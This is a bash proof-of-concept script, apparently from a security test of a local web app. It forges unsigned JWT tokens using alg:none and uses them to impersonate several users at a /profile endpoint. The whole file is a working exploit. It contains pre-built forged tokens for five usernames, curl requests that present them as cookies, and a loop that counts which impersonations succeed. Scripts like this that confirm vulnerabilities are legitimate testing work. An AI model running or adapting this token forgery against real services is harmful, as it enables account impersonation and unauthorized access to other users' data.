#!/bin/bash

# POC: Horizontal Privilege Escalation via JWT Forgery (Version 2)
# This demonstrates forging JWT tokens to impersonate other users
# Using pre-computed tokens with alg:none

TARGET="http://localhost:5003"
PROFILE_ENDPOINT="/profile"

echo "=== Horizontal Privilege Escalation - JWT Forgery POC ==="
echo ""

# Step 1: Test access with forged token for user2
echo "[*] Step 1: Attempting to impersonate user2 with forged JWT token (alg:none)..."
echo ""

# Forged JWT token: alg=none, username=user2, role=user
# This is constructed without any signature (no cryptographic verification needed)
FORGED_TOKEN_USER2="eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIyIiwicm9sZSI6InVzZXIifQ."

echo "[*] Forged token for user2:"
echo "    $FORGED_TOKEN_USER2"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" -b "token=$FORGED_TOKEN_USER2" "$TARGET$PROFILE_ENDPOINT")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "[*] Request: GET $TARGET$PROFILE_ENDPOINT with forged token"
echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
  echo "[+] SUCCESS: Forged token accepted!"
  echo "[+] Response body (user2 profile):"
  echo "$BODY"
  echo ""
else
  echo "[-] FAILED: Got HTTP $HTTP_CODE instead of 200"
  exit 1
fi

echo ""

# Step 2: Verify we can access other users' profiles
echo "[*] Step 2: Testing sequential user impersonation (user1, user3, user5, user9)..."
echo ""

# Pre-computed forged tokens for different users (alg:none, role:user)
declare -A FORGED_TOKENS=(
  [user1]="eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6InVzZXIifQ."
  [user3]="eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIzIiwicm9sZSI6InVzZXIifQ."
  [user5]="eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6InVzZXI1Iiwicm9sZSI6InVzZXIifQ."
  [user9]="eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6InVzZXI5Iiwicm9sZSI6InVzZXIifQ."
)

SUCCESS_COUNT=0

for USERNAME in user1 user3 user5 user9; do
  TOKEN="${FORGED_TOKENS[$USERNAME]}"
  RESPONSE=$(curl -s -w "\n%{http_code}" -b "token=$TOKEN" "$TARGET$PROFILE_ENDPOINT")
  HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
  
  if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] $USERNAME: HTTP 200 - Successfully accessed profile"
    SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
  else
    echo "[-] $USERNAME: HTTP $HTTP_CODE - Access denied or error"
  fi
done

echo ""
echo "=== EXPLOITATION SUMMARY ==="
echo "[+] Successfully forged JWT tokens for $SUCCESS_COUNT users"
echo "[+] All tokens use alg:none (no cryptographic verification)"
echo "[+] All tokens maintain user role (no escalation needed)"
echo "[+] VULNERABILITY CONFIRMED: Horizontal privilege escalation via JWT forgery"
echo "[+] Impact: Any user can impersonate any other user and access their profile"
echo ""